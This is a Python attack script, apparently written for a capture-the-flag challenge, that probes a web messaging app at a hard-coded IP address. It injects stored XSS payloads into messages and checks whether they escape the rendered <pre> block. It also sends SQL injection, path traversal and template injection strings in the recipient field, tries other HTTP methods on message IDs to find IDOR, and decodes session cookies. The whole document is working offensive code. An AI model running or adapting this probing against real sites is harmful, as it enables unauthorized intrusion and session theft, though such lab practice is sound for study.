import requests
import re
import json

base = 'http://154.57.164.80:31506'

# Login as testuser1
s = requests.Session()
s.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})

# IMPORTANT: Check the exact HTML rendering of XSS payload
# Send HTML that would break out of <pre> tag
payloads_to_test = [
    '</pre><script>alert(1)</script><pre>',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    'normal text',
]

for i, payload in enumerate(payloads_to_test):
    username = f'xss_tester_{i}'
    s2 = requests.Session()
    try:
        s2.post(f'{base}/register', data={'username': username, 'password': 'pass123'})
    except:
        pass
    s2.post(f'{base}/login', data={'username': username, 'password': 'pass123'})
    s2.post(f'{base}/messages', data={'to_username': username, 'content': payload}, allow_redirects=True)
    
    r = s2.get(f'{base}/')
    ids = re.findall(r'/messages/(\d+)', r.text)
    if ids:
        r2 = s2.get(f'{base}/messages/{ids[0]}')
        # Extract the letter-copy content area
        match = re.search(r'<pre class="letter-copy">(.*?)</pre>', r2.text, re.DOTALL)
        if match:
            print(f'Payload {i}: {payload!r}')
            print(f'  Rendered as: {match.group(0)!r}')
        else:
            # Maybe it broke out of the pre tag
            print(f'Payload {i}: {payload!r}')
            print(f'  NO <pre class="letter-copy"> found!')
            # Look for what's in the scroll-content area
            match2 = re.search(r'letter-copy.*?</section>', r2.text, re.DOTALL)
            if match2:
                print(f'  Content area: {match2.group(0)[:300]!r}')
    print()

# Now let's try to enumerate more about the app  
# Check if there are IDOR on message deletion, etc.
print("\n=== TRYING DIFFERENT HTTP METHODS ON MESSAGES ===")
for method in ['DELETE', 'PUT', 'PATCH']:
    r = s.request(method, f'{base}/messages/1')
    print(f'  {method} /messages/1: status={r.status_code}')

# Check if to_username is vulnerable to injection
print("\n=== TESTING TO_USERNAME FIELD ===")
special_users = [
    'admin',
    'admin" OR 1=1 --',
    "admin' OR 1=1 --",
    '../../../etc/passwd',
    '{{7*7}}',
    'admin\nadmin2',
]
for user in special_users:
    s3 = requests.Session()
    s3.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})
    r = s3.post(f'{base}/messages', data={'to_username': user, 'content': 'test'}, allow_redirects=False)
    print(f'  to_username={user!r:40} -> status={r.status_code} loc={r.headers.get("Location", "")}')

# Check if there's something with cookies
print("\n=== COOKIE INFO ===")
s4 = requests.Session()
s4.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})
for cookie in s4.cookies:
    print(f'  Cookie: {cookie.name}={cookie.value}')
    print(f'    Secure={cookie.secure}, HttpOnly={cookie.has_nonstandard_attr("HttpOnly")}')
    print(f'    Path={cookie.path}')
    # Try decoding if it's a JWT or session
    import base64
    try:
        # Try JWT decode
        parts = cookie.value.split('.')
        if len(parts) == 3:
            for j, part in enumerate(parts[:2]):
                padded = part + '=' * (4 - len(part) % 4)
                decoded = base64.urlsafe_b64decode(padded)
                print(f'    JWT part {j}: {decoded}')
    except:
        pass
    # Check for express session
    if cookie.value.startswith('s%3A'):
        print(f'    Express signed session detected')
        # The actual session ID is before the .signature
        import urllib.parse
        decoded = urllib.parse.unquote(cookie.value)
        print(f'    Decoded: {decoded}')
